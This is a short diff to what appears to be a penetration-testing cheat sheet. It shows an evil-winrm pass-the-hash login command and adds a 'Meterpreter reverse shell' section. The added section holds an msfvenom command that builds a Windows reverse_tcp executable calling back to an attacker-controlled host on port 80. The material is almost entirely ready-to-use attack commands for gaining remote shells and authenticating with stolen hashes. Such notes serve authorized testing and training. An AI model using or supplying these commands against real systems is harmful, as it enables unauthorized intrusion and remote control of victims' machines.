@@ -37,4 +37,7 @@ evil-winrm -i 192.168.1.1 -u 'username' -H '00000000000000000000000000000000'
 ```
 
 ## Meterpreter reverse shell (1)
-...
+Payload for windows:
+``` bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI LPORT=80 -f exe > reverse.exe
+```
